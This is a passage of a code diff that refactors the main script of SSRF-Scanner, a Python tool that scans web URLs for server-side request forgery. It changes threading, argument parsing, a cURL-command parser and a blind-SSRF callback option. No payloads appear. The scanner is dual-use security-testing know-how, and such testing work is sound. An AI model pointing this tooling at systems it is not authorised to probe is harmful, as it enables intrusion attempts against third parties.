+                print(f"{Fore.CYAN}[*] Auto-crawling single target...{Style.RESET_ALL}")
+                self.crawl(input_data)
+        elif isinstance(input_data, list):
+            for u in input_data: self.q.put(u)
 
-            threads = []
-            for _ in range(self.config.scanner['threads']):
-                t = Thread(target=self.scan_urls)
-                t.daemon = True
-                t.start()
-                threads.append(t)
+        print(f"{Fore.GREEN}[+] Starting scan with {self.cfg.get('threads')} threads...{Style.RESET_ALL}")
+        
+        threads = []
+        for _ in range(self.cfg.get('threads')):
+            t = Thread(target=self.worker)
+            t.daemon = True
+            t.start()
+            threads.append(t)
+
+        try:
             self.q.join()
-            summary = self.reporter.generate_summary(
-                urls_analyzed=self.urls_analyzed,
-                error_urls=self.error_urls
-            )
-            print(summary)
         except KeyboardInterrupt:
-            print(Fore.RED + "\n[!] Scan interrupted by user (Ctrl+C)")
-            summary = self.reporter.generate_summary(
-                urls_analyzed=self.urls_analyzed,
-                error_urls=self.error_urls
-            )
-            print(summary)
-            sys.exit(1)
+            print(f"\n{Fore.YELLOW}[!] Interrupted. Saving results...{Style.RESET_ALL}")
+            self.stop_event.set()
 
+        self.reporter.finalize()
 
-def print_banner():
-    """Prints the application banner."""
-    print("""
-            ░██████╗░██████╗██████╗░███████╗
-            ██╔════╝██╔════╝██╔══██╗██╔════╝
-            ╚█████╗░╚█████╗░██████╔╝█████╗░░
-            ░╚═══██╗░╚═══██╗██╔══██╗██╔══╝░░
-            ██████╔╝██████╔╝██║░░██║██║░░░░░
-            ╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝
-    """)
-    print(__version__ + " by RuslanSemchenko")
-    print(Fore.YELLOW + "[WRN] Use with caution. You are responsible for your actions.")
-    print(Fore.YELLOW + "[WRN] Developers assume no liability and are not responsible for any misuse or damage.")
+def parse_curl_command(command: str) -> Dict[str, Any]:
+    try:
+        tokens = shlex.split(command)
+        url = None
+        method = "GET"
+        headers = {}
+        data = None
+        cookies = {}
+        for i, token in enumerate(tokens):
+            if token.startswith("http"): url = token
+            elif token in ("-H", "--header"):
+                key, value = tokens[i+1].split(":", 1)
+                headers[key.strip()] = value.strip()
+            elif token in ("-X", "--request"): method = tokens[i+1].upper()
+            elif token in ("-d", "--data", "--data-raw"): data = tokens[i+1]
+            elif token in ("-b", "--cookie"):
+                cookie_str = tokens[i+1]
+                for cookie in cookie_str.split(";"):
+                    if "=" in cookie:
+                        k, v = cookie.split("=", 1)
+                        cookies[k.strip()] = v.strip()
+        return { "url": url, "method": method, "headers": headers, "data": data, "cookies": cookies }
+    except Exception as e:
+        print(f"Error parsing CURL: {e}")
+        return {}
 
 def main():
-    """Main function to parse arguments and run the scanner."""
-    parser = argparse.ArgumentParser(
-        description="SSRF-Scanner: An automated tool to find potential SSRF issues.",
-        formatter_class=argparse.RawTextHelpFormatter,
-        epilog=f"""
-Examples:
-  python3 {sys.argv[0]} -u https://example.com
-  python3 {sys.argv[0]} -u https://example.com -b http://your_callback_server
-  python3 {sys.argv[0]} -f urls.txt -t 20
-  python3 {sys.argv[0]} -u https://example.com -c "session=abc123def456" --debug
-"""
-    )
-
-    target_group = parser.add_mutually_exclusive_group(required=True)
-    target_group.add_argument("-u", "--url", help="A single URL to scan.")
-    target_group.add_argument(
-        "-f", "--file", help="File containing a list of URLs to scan."
-    )
-
-    parser.add_argument(
-        "-b", "--backurl", help="Callback URL for out-of-band SSRF detection."
-    )
-    parser.add_argument(
-        "-c", "--cookie", help="Cookie to use for requests (e.g., 'name1=value1; name2=value2')."
-    )
-    parser.add_argument(
-        "-t", "--threads", type=int, default=10, help="Number of concurrent threads (default: 10)."
-    )
-    parser.add_argument(
-        "--timeout", type=int, default=3, help="Request timeout in seconds (default: 3)."
-    )
-    parser.add_argument(
-        "-d", "--debug", action="store_true", help="Enable debug mode for verbose output."
-    )
-    parser.add_argument('--version', action='version', version=f'%(prog)s {__version__}')
-
+    parser = argparse.ArgumentParser(description="SSRF-Scanner - Advanced Scanning Suite")
+    input_group = parser.add_mutually_exclusive_group(required=True)
+    input_group.add_argument("-u", "--url", help="Target URL")
+    input_group.add_argument("-f", "--file", help="List of URLs")
+    input_group.add_argument("--curl", help="Raw cURL command (quoted)")
+    parser.add_argument("-t", "--threads", type=int, default=15, help="Threads (def: 15)")
+    parser.add_argument("-b", "--backurl", help="Blind SSRF Callback URL")
+    parser.add_argument("--timeout", type=int, default=6, help="Timeout sec")
+    parser.add_argument("--debug", action="store_true", help="Verbose mode")
+    parser.add_argument("--no-crawl", action="store_true", help="Disable crawler")
     args = parser.parse_args()
 
-    config = Config()
-    config.scanner['debug'] = args.debug
-    config.scanner['threads'] = args.threads
-    config.scanner['timeout'] = args.timeout
+    cfg = Config()
+    cfg.set('threads', args.threads)
+    cfg.set('timeout', args.timeout)
+    cfg.set('debug', args.debug)
+    cfg.set('backurl', args.backurl)
+    if args.no_crawl: cfg.set('crawl_depth', 0)
 
-    scanner = SSRFScanner(config)
-    scanner.backurl = args.backurl
-    scanner.cookies = args.cookie
+    scanner = SSRFScanner(cfg)
 
-    scanner.run(urls=[args.url] if args.url else None, url_file=args.file)
+    if args.curl:
+        req_data = parse_curl_command(args.curl)
+        if req_data.get('url'):
+            print(f"{Fore.GREEN}[+] Loaded from cURL: {req_data['url']}{Style.RESET_ALL}")
+            scanner.run(req_data['url'])
+        else: print("Invalid cURL command")
+    else:
+        target = args.url if args.url else args.file
+        scanner.run(target)
 
 if __name__ == "__main__":
     main()
